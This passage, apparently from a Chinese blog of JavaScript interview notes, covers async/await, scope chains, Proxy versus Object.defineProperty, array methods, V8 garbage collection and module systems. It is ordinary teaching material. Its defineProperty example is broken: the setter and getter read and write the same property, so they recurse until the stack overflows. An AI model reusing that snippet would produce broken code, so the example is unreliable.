等待1秒后返回数据再往下执行</span></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> fn2(data1) <span class="comment">// 拿data1去请求2秒后，往下走</span></span><br><span class="line">  <span class="built_in">console</span>.log(data2) <span class="comment">// 总共3秒后 输出 50</span></span><br><span class="line">&#125;</span><br><span class="line">req()</span><br></pre></td></tr></table></figure><h3 id="async-await-与-Generator-的区别？"><a href="#async-await-与-Generator-的区别？" class="headerlink" title="async/await 与 Generator 的区别？"></a>async/await 与 Generator 的区别？</h3><p>（1）内置执行器。Generator 函数的执行必须靠执行器，所以才有了 co 模块，而 async 函数自带执行器，无需手动执行 next() 方法。</p><p>（2）更好的语义。async 和 await ，比起 * 和 yield ，语义更清楚。 async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。</p><p>（3）更广的适用性。co 模块约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以是 Promise 对象和原始类型的值<strong>（数值、字符串和布尔值，但这时会自动转成 立即 resolved 的 Promise 对象）。</strong></p><p>（4）返回值是 Promise。async 函数的返回值是 Promise 对象，比 Generator 函数返回的 Iterator 对象方便，可以直接使用 then() 方法进行调用。进一步说，async 函数完全可以看作多个异步操作包装成的一个 Promise 对象，而 await 命令就是内部 then 命令的语法糖。当回调函数执行的时候，一旦遇到 await 就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。</p><p><a href="https://blog.csdn.net/a18792627168/article/details/106170485">https://blog.csdn.net/a18792627168/article/details/106170485</a></p><p><a href="https://juejin.cn/post/6844903988584775693%E3%80%82">https://juejin.cn/post/6844903988584775693。</a></p><h3 id="asycn-await-和-promise-的区别？"><a href="#asycn-await-和-promise-的区别？" class="headerlink" title="asycn/await 和 promise 的区别？"></a>asycn/await 和 promise 的区别？</h3><ul><li>async/await 建立在 promise 上，不能被使用在普通回调以及节点回调</li><li>async/await 相对于 promise 来讲，写法更加优雅，看起来像同步代码</li></ul><h2 id="JavaScript-作用域与作用域链？（高频）"><a href="#JavaScript-作用域与作用域链？（高频）" class="headerlink" title="JavaScript 作用域与作用域链？（高频）"></a>JavaScript 作用域与作用域链？（高频）</h2><p><strong>作用域</strong>：可访问变量，对象，函数的集合。</p><ol><li>全局作用域：任何不在函数中或是大括号中声明的变量，都是在全局作用域下，全局作用域下声明的变量可以在程序的任意位置访问。</li><li>函数作用域：也叫局部作用域，如果一个变量是在函数内部声明的它就在一个函数作用域下面。这些变量只能在函数内部访问，不能在函数以外去访问。</li><li>块级作用域：在大括号中使用 let 和 const 声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。</li></ol><p><strong>变量提升：</strong>无论在函数中何处位置声明的变量，好像都被提升到了函数首部，可以在变量声明前访问而不会报错。</p><p><strong>本质原因</strong>： js 引擎在代码执行前有一个解析的过程，创建了执行上下文，初始化代码执行时需要用到的对象。当访问一个变量时，会到当前执行上下文中的作用域链中查找，而作用域链的首端指向当前执行上下文的变量对象，这个变量对象是执行上下文的一个属性，包含函数的形参、所有的函数和变量声明，这个对象是在代码解析的时候创建的。这就是出现变量声明提升的根本原因。</p><p><strong>作用域链</strong>：一个指向变量对象的指针列表。作用域链的顶端始终是当前执行上下文的变量对象，底端始终是全局执行上下文的变量对象（全局对象）。作用是<strong>保证对执行环境有权访问的所有变量和函数的有序访问</strong>，通过作用域链可以访问到外层环境的变量和函数（沿着作用域链向下查找）。</p><p><strong>执行上下文</strong>：每个执行上下文中都有三个重要的属性：变量对象（VO，包含变量、函数声明和函数的形参）；作用域链；this。具体见<a href="https://www.bookstack.cn/read/CS-Interview-Knowledge-Map/spilt.8.JS-JS-ch.md">https://www.bookstack.cn/read/CS-Interview-Knowledge-Map/spilt.8.JS-JS-ch.md</a></p><ul><li>全局执行上下文。只有全局能访问到变量对象。</li><li>函数执行上下文。VO 不能访问，只能访问到活动对象（AO）</li><li>eval 执行上下文</li></ul><h3 id="new-了一个-Car-对象，这个-car-的作用域链？（todo）"><a href="#new-了一个-Car-对象，这个-car-的作用域链？（todo）" class="headerlink" title="new 了一个 Car 对象，这个 car 的作用域链？（todo）"></a>new 了一个 Car 对象，这个 car 的作用域链？（todo）</h3><h3 id="v8-怎么实现变量提升？"><a href="#v8-怎么实现变量提升？" class="headerlink" title="v8 怎么实现变量提升？"></a>v8 怎么实现变量提升？</h3><h2 id="防抖与节流"><a href="#防抖与节流" class="headerlink" title="防抖与节流"></a>防抖与节流</h2><p>原理：使用 <code>setTimeout</code> 来存放待执行的函数，这样可以很方便的利用 <code>clearTimeout</code> 在合适的时机来清除待执行的函数。</p><ul><li><strong>函数防抖</strong>： 在事件被触发 n 秒后再执行回调，如果在这 n 秒内事件又被触发，则重新计时。</li><li><strong>函数节流</strong>： 规定一个单位时间，在这个单位时间内，只能有一次触发事件的回调函数执行，如果在同一个单位时间内某事件被触发多次，只有一次能生效。</li></ul><p><strong>防抖函数的应用场景：</strong></p><ul><li>按钮提交场景：防⽌多次提交按钮，只执⾏最后提交的⼀次</li><li>服务端验证场景：表单验证需要服务端配合，只执⾏⼀段连续的输⼊事件的最后⼀次</li></ul><p><strong>节流函数的应用场景：</strong></p><ul><li>拖拽场景：固定时间内只执⾏⼀次，防⽌超⾼频次触发位置变动</li><li>缩放场景：监控浏览器resize</li><li>动画场景：避免短时间内多次触发动画引起性能问题</li></ul><p>实现 [=&gt;](#实现 js 的节流与防抖（高频）)</p><h2 id="介绍-Object-defineProperty-？"><a href="#介绍-Object-defineProperty-？" class="headerlink" title="介绍 Object.defineProperty ？"></a>介绍 Object.defineProperty ？</h2><p>Object.defineProperty 函数一共有三个参数，第一个参数是<strong>需要定义属性的对象</strong>，第二个参数是<strong>需要定义的属性</strong>，第三个是<strong>该属性描述符</strong>。属性描述符的值如下：</p><ul><li>value：属性的值。</li><li>writable：属性能否被赋值。</li><li>enumerable：for in 能否枚举该属性。</li><li>configurable：该属性能否被删除或者改变特征值。</li></ul><p>可以通过 Object.defineProperty 函数改变属性的特征，或者定义访问器属性。</p><h3 id="使用-Object-defineProperty-来进行数据劫持的缺点？"><a href="#使用-Object-defineProperty-来进行数据劫持的缺点？" class="headerlink" title="使用 Object.defineProperty() 来进行数据劫持的缺点？"></a><strong>使用 Object.defineProperty() 来进行数据劫持的缺点？</strong></h3><ul><li>不能监听数组的变化（即如果对象上有新增的属性，需要对新增的属性再次进行劫持）</li><li>必须遍历对象的每个属性</li><li>如果属性是对象，还需要深层遍历。</li></ul><p>这也是为什么**Vue给对象新增属性需要通过<code>$set</code>**的原因，其原理也是通过<code>Object.defineProperty</code>对新增的属性再次进行劫持</p><h2 id="什么是-Proxy-？"><a href="#什么是-Proxy-？" class="headerlink" title="什么是 Proxy ？"></a>什么是 Proxy ？</h2><p>Proxy 是 ES6 中新增的功能，可以用来自定义对象中的操作。Proxy 可以理解成在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截。因此可以通过它对外界的访问进行过滤和改写。</p><p><code>let p = new Proxy(target, handler)</code>。target 代表需要添加代理的对象，handler 用来自定义对象中的操作，比如可以用来自定义 set 或者 get 函数。</p><h3 id="Proxy-与-Object-defineProperty-有什么区别？（高频）"><a href="#Proxy-与-Object-defineProperty-有什么区别？（高频）" class="headerlink" title="Proxy 与 Object.defineProperty 有什么区别？（高频）"></a>Proxy 与 Object.defineProperty 有什么区别？（高频）</h3><ul><li>Proxy 针对整个对象，而 Object.defineProperty 针对单个属性，前者解决了需要对对象进行深度递归，实现对每个属性劫持的问题。</li><li>Proxy 解决了 Object.defineProperty 无法劫持数组的问题。</li><li>比 Object.defineProperty 有更多的拦截方法，对比一些新的浏览器，可能会对 Proxy 针正对性的优化，有助于性能提升。</li></ul><p>Proxy 的缺点也很明显，作为新的内置对象，对老浏览器的兼容性就不那么友好了，所以在使用的时候得考虑兼容问题。</p><h3 id="如何监听一个对象的变化？（高频）"><a href="#如何监听一个对象的变化？（高频）" class="headerlink" title="如何监听一个对象的变化？（高频）"></a>如何监听一个对象的变化？（高频）</h3><ul><li>ES5 的 <code>Object.defineProperty()</code>：首先需要通过<code>Object.defineProperty()</code>为需要监听的属性设置一个代理，然后通过代理的值触发<code>set</code>和<code>get</code>的方法。在方法中编写逻辑操作：</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>, </span><br><span class="line">  <span class="attr">set</span>: <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;name 发生变化！&#x27;</span>)</span><br><span class="line">    <span class="built_in">this</span>.name = v;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.name =<span class="string">&quot;2&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li><p>ES6 的 proxy 代理：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">  <span class="attr">set</span>: <span class="function"><span class="keyword">function</span> (<span class="params">target, name, value</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;name 发生变化！&#x27;</span>);</span><br><span class="line">    <span class="comment">// 改变被代理对象的值,使之保持一致</span></span><br><span class="line">    target[name] = value;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(obj, handler);</span><br><span class="line">proxy.name =<span class="string">&quot;2&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="数组有哪些原生方法？（高频）"><a href="#数组有哪些原生方法？（高频）" class="headerlink" title="数组有哪些原生方法？（高频）"></a>数组有哪些原生方法？（高频）</h2><p><strong>改变原数组：</strong></p><ul><li>pop()：弹出数组的最后一个元素，返回该元素</li><li>push(…items)：向数组的最后一个位置插入元素，返回插入后的长度</li><li>shift()：弹出数组的第一个元素，返回该元素</li><li>unshift(…items)：向数组的第一个位置插入元素，返回插入后的长度</li><li>reverse()：原地颠倒数组，并返回它</li><li>splice(pos,deleteCount,…items)：pos元素后删除指定个数，并在当前位置插入元素</li><li>fill()：批量初始化数组。<ul><li>参数一: 填充值</li><li>参数二: 开始填充位置(不写默认是全部填充)  </li><li>参数三: 结束填充位置-1(不写表示填充到末尾)</li></ul></li><li>sort(func)：排序并返回数组</li></ul><p><strong>不改变：</strong></p><ul><li>forEach(func)：为每个元素调用 func，不返回任何东西</li><li>find/filter(func)：通过 func 过滤元素，返回 true 条件的符合 find 函数的第一个值或符合 filter 函数的全部值</li><li>map(func)：从每个元素调用 func 的结果，创建一个新数组</li><li>some(func)：通过 func 检测数组中是否有元素满足条件，有则返回true</li><li>every(func)：通过 func 检测数组中是否所有元素满足条件</li><li>reduce(func,initial)：通过为每个元素调用 func 计算数组上的单个值并在调用之间传递中间结果。</li><li>concat(…items)：返回一个新数组：复制当前数组的所有成员并向其中添加 items.。如果有任何 items 是一个数组，那么就取其元素。</li><li>slice(start,end)：它从所有元素的开始索引”start” 复制到”end” (不包括”end” )返回一个新的数组。</li><li>flat()：数组降维，并会去除数组中的空项</li></ul><h3 id="map-filter-reduce-各自有什么作用？（reduce细谈）"><a href="#map-filter-reduce-各自有什么作用？（reduce细谈）" class="headerlink" title="map, filter, reduce 各自有什么作用？（reduce细谈）"></a>map, filter, reduce 各自有什么作用？（reduce细谈）</h3><p><code>map</code> 作用是生成一个新数组，遍历原数组，将每个元素拿出来做一些变换然后放入到新的数组中。</p><p><code>filter</code> 作用也是生成一个新数组，在遍历数组的时候将返回值为 <code>true</code> 的元素放入新数组，可以利用这个函数删除不需要的元素。</p><p><code>reduce()</code> 方法对数组中的每个元素执行一个 <strong>reducer</strong> 函数(升序执行)，将其结果汇总为单个返回值。<strong>reducer</strong> 函数接收4个参数:</p><ol><li>Accumulator (acc) (累计器)</li><li>Current Value (cur) (当前值)</li><li>Current Index (idx) (当前索引)</li><li>Source Array (src) (源数组)</li></ol><p>reduce 第二个参数为 <code>initialValue</code>（可选），作为第一次调用 <code>callback</code> 函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。具体用法见 <a href="https://juejin.cn/post/6844904063729926152">25个你不得不知道的数组reduce高级用法</a>。</p><h3 id="遍历的常见方法"><a href="#遍历的常见方法" class="headerlink" title="遍历的常见方法?"></a>遍历的常见方法?</h3><ol><li>数组：<ul><li><strong>for</strong>       遍历数组索引</li><li><strong>forEach()</strong>   回调函数参数更丰富，元素、索引、原数组都可以获取。(无法跳出循环)</li><li><strong>for…of</strong>   遍历数组元素（<code>ES6</code>新增）</li><li><strong>some()</strong> </li><li><strong>every()<strong>：</strong>二者都是用来做数组条件判断的，返回一个布尔值</strong>，可以被中断。</li><li><strong>map()</strong> </li><li><strong>filter()</strong> ：<strong>二者都是生成一个新数组，不会改变原数组（不包括遍历对象数组，是在回调函数中操作元素对象）</strong>，都会跳过空元素。</li><li><strong>find()</strong> </li><li><strong>findIndex()<strong>：</strong>二者都是用来查找数组元素。</strong></li></ul></li><li>[对象](##JavaScript 遍历对象属性的几种方式？)：<ul><li><strong>for…in：</strong>返回所有能够通过对象访问、可枚举的属性，既包括存在于实例中的属性，也包括存在于原型中可枚举的属性。如果只需要获取对象的实例属性，可以使用 hasOwnProperty 进行过滤。</li><li><strong>Object.keys()：</strong>获取对象自身所有的可枚举的属性名，但不包括原型中的属性，然后返回一个由属性名组成的数组。</li><li>**Object.values()**：获取对象自身所有的可枚举的属性值，但不包括原型中的属性，然后返回一个由属性值组成的数组。</li></ul></li></ol><h4 id="for…of-和-for…in-区别？"><a href="#for…of-和-for…in-区别？" class="headerlink" title="for…of 和 for…in 区别？"></a>for…of 和 for…in 区别？</h4><ul><li>for in ：遍历方法，可遍历对象和数组，获取属性名</li><li>for of ：遍历方法，只能遍历数组，不能遍历非 iterable 对象，获取属性值</li></ul><h4 id="forEach-和-for…of-区别？"><a href="#forEach-和-for…of-区别？" class="headerlink" title="forEach 和 for…of 区别？"></a>forEach 和 for…of 区别？</h4><p>foreach 缺点：无法在所有元素都传递给调用的函数之前终止遍历。（不支持break，continue，return）</p><p>for…of 优点：支持break，continue，return；提供了遍历所有数据结构的统一操作接口。</p><h4 id="for-循环注意点"><a href="#for-循环注意点" class="headerlink" title="for 循环注意点"></a>for 循环注意点</h4><ul><li>当判断语句含有多个语句时，以最后一个判断语句的值为准，因此下面的代码会执行 10 次。</li><li>当判断语句为空时，循环会一直进行。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">5</span>, j &lt; <span class="number">9</span>; i++, j++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="清空数组的几种方法？"><a href="#清空数组的几种方法？" class="headerlink" title="清空数组的几种方法？"></a>清空数组的几种方法？</h3><ol><li>splice(0,arrLen)</li><li>给数组长度赋值为0</li><li>给数组变量重新赋值 []：Array 属于引用类型数据，相当于重定向到空数组</li></ol><h3 id="判断是否为-Array-的方法？（高频）"><a href="#判断是否为-Array-的方法？（高频）" class="headerlink" title="判断是否为 Array 的方法？（高频）"></a>判断是否为 Array 的方法？（高频）</h3><p>有空补充：<a href="https://cloud.tencent.com/developer/article/1508145">https://cloud.tencent.com/developer/article/1508145</a></p><ol><li><code>Array.isArray()</code></li><li><code>arr.constructor === Array</code>：判断对象的<strong>构造函数</strong>是否是数组。</li><li><code>arr instanceof Array</code>：运算符用于检测<strong>构造函数的 prototype 属性</strong>是否出现在某个实例对象的原型链上。</li><li><code>Array.prototype.isPrototypeOf()</code>：用于测试一个对象是否存在于<strong>另一个对象的原型链</strong>上。</li><li><code>Object.getPrototypeOf(arr) === Array.prototype</code>：返回指定对象的原型，如果对象的原型是数组原型，即可确定对象就是数组。</li><li><code>Object.prototype.toString.call(arr) === &#39;[object Array]&#39;</code>： 每一个继承 Object 的对象都有 toString 方法，如果 toString 方法没有重写的话，会返回 [Object type]，其中 type 为对象的类型。</li></ol><h4 id="isArray-原理？"><a href="#isArray-原理？" class="headerlink" title="isArray() 原理？"></a>isArray() 原理？</h4><p>运用对象原型的<code>toString</code>方法将Array转换为字符串，之后进行比对。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.isArray = <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(value) === <span class="string">&#x27;[object Array]&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何获取一个对象的属性"><a href="#如何获取一个对象的属性" class="headerlink" title="如何获取一个对象的属性"></a>如何获取一个对象的属性</h2><ul><li><p><strong>Object.keys/values/entries</strong>：<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys"><code>Object.keys</code></a> 用来获取属性名集合，<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/values"><code>Object.values</code></a> 是用来获取属性值集合，<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries"><code>Object.entries</code></a> 则是用来获取属性键-值对集合的。这三个属性有一个共同点：只处理 <code>obj</code> 自身的<strong>可枚举字符串属性</strong>。</p></li><li><p><strong>Object.getOwnPropertyNames(obj)<strong>：返回了 <code>obj</code> 自身的</strong>所有字符串属性（包括不可枚举的）</strong>，但不包括 Symbol 属性。</p></li><li><p><strong>Object.getOwnPropertySymbols(obj)<strong>：返回 <code>obj</code> 自身的</strong>所有 Symbol 属性（包括不可枚举的）</strong>。</p></li><li><p><strong>for-in</strong>：返回的是<strong>对象自身及所在原型链上的所有可枚举字符串属性</strong>。配合 <code>obj.hasOwnProperty(prop)</code> 方法一起使用，就能得到跟 <code>Object.keys/values/entries</code> 方法一样的效果——即返回对象自身的可枚举字符串属性。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.hasOwnProperty(prop)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="“use-strict”-目的-（高频）"><a href="#“use-strict”-目的-（高频）" class="headerlink" title="“use strict” 目的 ? （高频）"></a>“use strict” 目的 ? （高频）</h2><p>use strict 是一种 ECMAScript5 添加的运行模式，这种模式使得 JavaScript 在更严格的条件下运行。目的：</p><ul><li>消除 JavaScript <strong>语法的一些不合理、不严谨之处</strong>，减少怪异行为；</li><li>消除代码运行的一些<strong>不安全之处</strong>，保证代码运行的安全；</li><li>提高<strong>编译器效率</strong>，增加运行速度；</li><li>为未来新版本的 JavaScript 做好铺垫。</li></ul><p>区别：</p><ul><li>禁止使用 with 语句。</li><li>禁止 this 关键字指向全局对象。this 为 undefined ，所以访问 this 的属性就会报错。</li><li>对象不能有重名的属性。</li></ul><h2 id="Ajax-是什么-（高频）"><a href="#Ajax-是什么-（高频）" class="headerlink" title="Ajax 是什么? （高频）"></a>Ajax 是什么? （高频）</h2><p>Ajax（Asynchronous JavaScript and XML）指通过 JavaScript 的异步通信，从服务器获取 XML 文档并提取数据，再更新当前网页的对应部分，而不用刷新整个网页。具体来说，AJAX 包括以下几个步骤:</p><ul><li>创建 XMLHttpRequest 对象，也就是创建一个异步调用对象</li><li>创建一个新的 HTTP 请求，并指定该 HTTP 请求的方法、URL 及验证信息</li><li>设置响应 HTTP 请求状态变化的函数</li><li>发送 HTTP 请求</li><li>获取异步调用返回的数据</li><li>使用 JavaScript 和 DOM 实现局部刷新</li></ul><p><a href="##%E6%89%8B%E5%86%99AJAX%EF%BC%881%EF%BC%89">=&gt;创建一个 Ajax</a></p><h2 id="V8-的垃圾回收机制？（高频）"><a href="#V8-的垃圾回收机制？（高频）" class="headerlink" title="V8 的垃圾回收机制？（高频）"></a>V8 的垃圾回收机制？（高频）</h2><p>V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。基于世代假说：新生的对象容易早死、不死的对象会活得更久。V8 将内存（堆）分为新生代和老生代两部分。</p><p>在 js 垃圾回收机制中，一旦某个变量不再被引用，那么这个变量将会被回收。——《JavaScript权威指南》</p><h3 id="新生代算法"><a href="#新生代算法" class="headerlink" title="新生代算法"></a>新生代算法</h3><p>新生代：<strong>新创建的对象或者只经历过一次的垃圾回收的对象</strong>。</p><p>新生代被分为 From 和 To 两个空间，To 一般是闲置的。新分配的对象会被放入 From 空间中，当 From 空间被占满时，新生代 GC 就会启动：</p><ol><li><p>首先检查 From 空间的存活对象，如果对象存活则判断对象是否满足晋升到老生代的条件，如果满足条件则晋升到老生代。如果不满足条件则移动 To 空间。</p></li><li><p>如果对象不存活，则释放对象的空间。</p></li><li><p>最后将 From 空间和 To 空间角色进行交换。</p></li></ol><h3 id="老生代算法"><a href="#老生代算法" class="headerlink" title="老生代算法"></a>老生代算法</h3><p>老生代：<strong>经历过多次垃圾回收的对象</strong>。新生代对象晋升到老生代有两个条件：</p><ul><li>新生代中的对象是否已经经历过一次 Scavenge 算法，如果经历过，则将对象从新生代空间移到老生代空间中，若没有经历，则复制到 To 空间。</li><li>To 空间的对象占比大小是否超过 25 %。若超过，为了不影响到内存分配，会将对象从新生代空间移到老生代空间中。设置 25% 的原因主要是因为算法结束后，两个空间结束后会交换位置，如果 To 空间的内存太小，会影响后续的内存分配。</li></ul><p>老生代中的对象一般存活时间较长且数量也多，使用<strong>标记清除算法</strong>和<strong>标记压缩算法</strong>。标记清除法首先会对内存中存活的对象进行标记，标记结束后清除掉那些没有标记的对象。由于标记清除后会造成很多的内存碎片，不便于后面的内存分配。所以了解决内存碎片的问题引入了标记压缩法。</p><p>在老生代中，以下情况会先启动标记清除算法：</p><ul><li>某一个空间没有分块的时候</li><li>空间中被对象超过一定限制</li><li>空间不能保证新生代中的对象移动到老生代中</li></ul><h2 id="模块化开发"><a href="#模块化开发" class="headerlink" title="模块化开发"></a>模块化开发</h2><p><strong>过程：</strong></p><ul><li><p>一个模块是实现一个特定功能的一组方法。由于函数具有独立作用域的特点，最原始的写法是使用函数来作为模块，几个函数作为一个模块，但是这种方式容易造成全局变量的污染，并且模块间没有联系。</p></li><li><p>后面提出了对象写法，通过将函数作为一个对象的方法来实现，这样解决了直接使用函数作为模块的一些缺点，但是这种办法会暴露所有的模块成员，外部代码可以修改内部属性的值。</p></li><li><p>使用立即执行函数实现模块化是常见的手段，通过利用闭包来实现模块私有作用域的建立，解决了命名冲突、污染全局作用域的问题。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">globalVariable</span>)</span>&#123;</span><br><span class="line">   globalVariable.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">   <span class="comment">// ... 声明各种变量、函数都不会污染全局作用域</span></span><br><span class="line">&#125;)(globalVariable)</span><br></pre></td></tr></table></figure></li></ul><p><strong>使用模块化好处：</strong></p><ul><li>解决命名冲突</li><li>提供复用性</li><li>提高代码可维护性</li></ul><p>js 中现在比较成熟的<strong>四种模块加载方案</strong>：</p><ul><li><p>CommonJS：通过 require 引入模块，通过 <code>module.exports</code> 定义模块的输出接口。这种模块加载方案是服务器端的解决方案，以同步的方式来引入模块，因为在服务端文件都存储在本地磁盘，所以读取非常快。但如果是在浏览器端，由于模块的加载是使用网络请求，因此使用异步加载的方式更加合适。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// or </span></span><br><span class="line"><span class="built_in">exports</span>.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">module</span> = <span class="built_in">require</span>(<span class="string">&#x27;./a.js&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.a <span class="comment">// -&gt; log 1</span></span><br></pre></td></tr></table></figure></li><li><p>AMD：采用异步加载的方式来加载模块，模块的加载不影响后面语句的执行，所有依赖这个模块的语句都定义在一个回调函数里，等到加载完成后再执行回调函数。<strong>require.js</strong> 实现了 <strong>AMD</strong> 规范。</p></li><li><p>CMD：和 AMD 方案一样都是为了解决异步模块加载的问题，<strong>sea.js</strong> 实现了 <strong>CMD</strong> 规范。它和 require.js的区别在于模块定义时<strong>对依赖的处理不同</strong>和<strong>对依赖模块的执行时机处理不同</strong>。</p></li><li><p>ES Module：使用 import 和 export 的形式来导入导出模块。</p></li></ul><h3 id="CommonJS-和-ES-Module-的区别？-lt-gt-import-和-require-的区别（高频）"><a href="#CommonJS-和-ES-Module-的区别？-lt-gt-import-和-require-的区别（高频）" class="headerlink" title="CommonJS 和 ES Module 的区别？&lt;=&gt; import 和 require 的区别（高频）"></a>CommonJS 和 ES Module 的区别？&lt;=&gt; import 和 require 的区别（高频）</h3><p>具体见 <a href="https://juejin.cn/post/6938581764432461854">聊聊什么是CommonJs和Es Module及它们的区别</a></p><ol><li><p>CommonJS 输出的是<strong>值的拷贝</strong>，ES Module 输出的是<strong>值的引用</strong>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m1.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> foo = <span class="string">&#x27;baz&#x27;</span>, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// m2.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;foo&#125; <span class="keyword">from</span> <span class="string">&#x27;./m1.js&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(foo), <span class="number">500</span>); <span class="comment">// bar baz</span></span><br></pre></td></tr></table></figure><p>ES6 模块不会缓存运行结果，而是动态地去被加载的模块取值</p></li><li><p>CommonJS 是运行时加载（<strong>动态</strong>，可以在语句中使用 require ），ES Module 是编译时输出接口（<strong>静态</strong>，只能在文件最顶部 import ）。</p></li><li><p>CommonJS 的 require() 是<strong>同步</strong>加载模块，ES Module 的 import 是<strong>异步</strong>加载模块，静态编译时加载，有独立的模块依赖解析。</p></li><li><p>CommonJS 模块的顶层 this 指向当前模块，ES6 模块顶层 this 指向 undefined。</p></li></ol><h3 id="export-default-和-export-区别？"><a href="#export-default-和-export-区别？" class="headerlink" title="export default 和 export 区别？"></a>export default 和 export 区别？</h3><p>部分参考自<a href="https://www.jianshu.com/p/edaf43e9384f">https://www.jianshu.com/p/edaf43e9384f</a></p><p>export default 命令为模块指定默认输出，这样就不需要知道所要加载模块的变量名。</p><ol><li>export与export default均可用于导出常量、函数、文件、模块等</li><li>在一个文件或模块中，export、import可以有多个，export default仅有一个</li><li>通过export方式导出，在导入时要加{ }，export default则不需要</li><li><strong>主要区别在于对应的 import 的区别</strong>：export 对应的 import 需要知道 export 抛出的变量名或函数名 <code>import&#123;a,b&#125;</code>；export default 对应的 import 不需要知道 export抛出的变量名或函数名 <code>import anyname</code></li></ol><h3 id="模块的循环加载？"><a href="#模块的循环加载？" class="headerlink" title="模块的循环加载？"></a>模块的循环加载？</h3><p>CommonJS 的做法是，一旦出现某个模块被”循环加载”，就<strong>只输出已经执行的部分</strong>，还未执行的部分不会输出。代码会停在循环引用处，等待引用返回再执行。</p><p>ES6 遇到模块加载命令<code>import</code>时，不会去执行模块，而是只生成一个引用。等到真的需要用到时，再到模块里面去取值。<strong>根本不关心是否发生了”循环加载”，只是生成一个指向被加载模块的引用</strong>.</p><h3 id="AMD-和-CMD-规范的区别？"><a href="#AMD-和-CMD-规范的区别？" class="headerlink" title="* AMD 和 CMD 规范的区别？"></a>* AMD 和 CMD 规范的区别？</h3><p>（1）在模块定义时对依赖的处理不同。AMD 推崇依赖前置，在定义模块的时候就要声明其依赖的模块。而 CMD 推崇就近依赖，只有在用到某个模块的时候再去 require 。</p><p>（2）对依赖模块的执行时机处理不同。首先 AMD 和 CMD 对于模块的加载方式都是异步加载，不过它们的区别在于模块的执行时机，AMD 在依赖模块加载完成后就直接执行依赖模块，依赖模块的执行顺序和我们书写的顺序不一定一致。而 CMD 